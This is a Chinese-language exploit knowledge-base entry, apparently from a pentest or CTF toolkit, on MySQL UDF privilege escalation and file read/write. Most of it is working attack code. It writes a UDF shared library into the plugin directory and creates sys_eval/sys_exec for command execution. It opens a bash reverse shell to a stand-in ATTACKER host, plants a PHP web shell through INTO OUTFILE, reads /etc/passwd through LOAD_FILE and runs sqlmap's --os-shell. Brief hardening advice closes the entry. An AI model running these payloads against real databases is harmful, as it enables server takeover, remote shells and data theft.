---
id: MYSQL-UDF-RCE
title: "MySQL - UDF 提权与文件操作"
product: mysql
vendor: Oracle
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, udf, 提权, 文件读写, 需要认证]
fingerprint: ["MySQL"]
---

## 漏洞描述

MySQL 支持通过 UDF（User-Defined Function）加载自定义共享库（.so/.dll）来扩展功能。攻击者在获取高权限（如 root）后，可以将恶意 UDF 共享库写入 plugin 目录，创建自定义函数实现操作系统命令执行。此外，MySQL 的 `LOAD_FILE()` 和 `INTO OUTFILE/DUMPFILE` 可用于读写文件系统。

## 影响版本

- 所有版本（需要 FILE 权限和 INSERT 权限）

## 前置条件

- MySQL root 权限或具有 FILE 权限的用户
- UDF 方式需要知道 plugin 目录路径
- secure_file_priv 未限制（文件读写）

## 利用步骤

### UDF 提权

```sql
-- 1. 查找 plugin 目录
SHOW VARIABLES LIKE 'plugin_dir';
-- 常见: /usr/lib/mysql/plugin/  或  /usr/lib64/mysql/plugin/

-- 2. 写入 UDF .so 文件（通过十六进制写入）
-- 使用 sqlmap 的 lib_mysqludf_sys.so 或自行编译
SELECT unhex('7F454C46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 3. 创建函数
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- 4. 执行命令
SELECT sys_eval('id');
SELECT sys_eval('cat /root/flag.txt');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### 文件读取

```sql
-- LOAD_FILE 读取（需要 FILE 权限且 secure_file_priv 允许）
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/flag.txt');

-- 检查 secure_file_priv 限制
SHOW VARIABLES LIKE 'secure_file_priv';
-- 空 = 无限制, NULL = 禁用, 路径 = 仅允许该路径
```

### 文件写入

```sql
-- INTO OUTFILE 写入（需要 FILE 权限且 secure_file_priv 允许）
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- INTO DUMPFILE 写入（不会在末尾加换行，适合写二进制文件）
SELECT unhex('...') INTO DUMPFILE '/var/www/html/shell.php';
```

## Payload

```bash
# 使用 sqlmap 自动 UDF 提权
sqlmap -d "mysql://root:PASSWORD@TARGET:3306/mysql" --os-shell

# 手动连接并检查环境
mysql -h TARGET -u root -p
> SHOW VARIABLES LIKE 'plugin_dir';
> SHOW VARIABLES LIKE 'secure_file_priv';
> SELECT @@version;
```

## 修复建议

1. 不使用 root 账号连接数据库应用
2. 设置 `secure_file_priv` 为指定目录或 NULL（禁用文件操作）
3. 限制 plugin 目录的文件系统写权限
4. 撤销普通用户的 FILE 权限
5. 以低权限系统用户运行 MySQL
6. 使用防火墙限制 3306 端口访问来源
